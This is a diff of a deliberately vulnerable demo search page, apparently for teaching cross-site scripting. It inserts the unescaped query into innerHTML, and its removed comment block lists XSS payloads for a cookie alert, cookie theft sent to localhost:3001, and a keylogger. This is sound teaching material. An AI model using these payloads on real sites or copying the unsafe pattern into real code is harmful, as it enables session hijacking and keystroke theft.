@@ -4,43 +4,28 @@
 </head>
 <body>
 
-	<form action="">
+	<!-- A simple form that when submitted will navigate back to the same page -->
+	<form action="" method="GET">
+		<!-- Adds `?q=VALUE` to the URL when the form is submitted -->
 		<input type="text" name="q">
 		<input type="submit" value="Search">
 	</form>
 
+	<!-- The results of the search are inserted here -->
 	<div id="results"></div>
 
 	<script>
-
-		/*
-			To try out these XSS attacks:
-				1) Open the developer tools in your browser (F12).
-				2) Use the JavaScript console to run the following:
-					encodeURIComponent('PASTE THE XSS ATTACK HERE');
-				3) Copy and paste the text from the console to the address bar. Replace the value for the q parameter with the encoded XSS attack text.
-
-			Proof of concept:
-			<img src="does-not-exist" onerror="alert(\'hi\')">
-
-			Alert session cookie:
-			<img src="does-not-exist" onerror="alert(document.cookie)">
-
-			Steal session cookie:
-			<img src="does-not-exist" onerror="var img = document.createElement(\'img\'); img.src = \'http://localhost:3001/cookie?cookie=\' + document.cookie; document.querySelector(\'body\').appendChild(img);">
-
-			Keylogger:
-			<img src="does-not-exist" onerror="document.querySelector(\'body\').addEventListener(\'keydown\', function(event) { console.log(event.key); });">
-		*/
-
 		document.addEventListener('DOMContentLoaded', function() {
 
+			/*
+				Get the search query from the URL. For example:
+				http://xss-example-page.nowhere/?q=Searching+for+things
+			*/
 			var q = getQueryParameter('q');
 
 			if (q) {
 
 				search(q, function(error, results) {
-
 					showQueryAndResults(q, results);
 				});
 			}
@@ -48,6 +33,7 @@
 
 		function search(q, callback) {
 
+			// Fake results. We don't actually searching anything.
 			var results = [
 				'Result #1',
 				'Result #2',
@@ -59,29 +45,30 @@
 
 		function showQueryAndResults(q, results) {
 
+			var resultsEl = document.querySelector('#results');
 			var html = '';
 
 			html += '<p>Your search query:</p>';
 			html += '<pre>' + q + '</pre>';
 			html += '<ul>';
 
-			for (var i = 0; i < results.length; i++) {
-				html += '<li>' + results[i] + '</li>';
+			for (var index = 0; index < results.length; index++) {
+				html += '<li>' + results[index] + '</li>';
 			}
 
 			html += '</ul>';
 
-			var resultsEl = document.querySelector('#results');
 			resultsEl.innerHTML = html;
 		}
 
 		function getQueryParameter(name) {
 
 			var pairs = window.location.search.substring(1).split('&');
+			var pair;
 
-			for (var i = 0; i < pairs.length; i++) {
+			for (var index = 0; index < pairs.length; index++) {
 
-				var pair = pairs[i].split('=');
+				pair = pairs[index].split('=');
 
 				if (decodeURIComponent(pair[0]) === name) {
 					return decodeURIComponent(pair[1]);
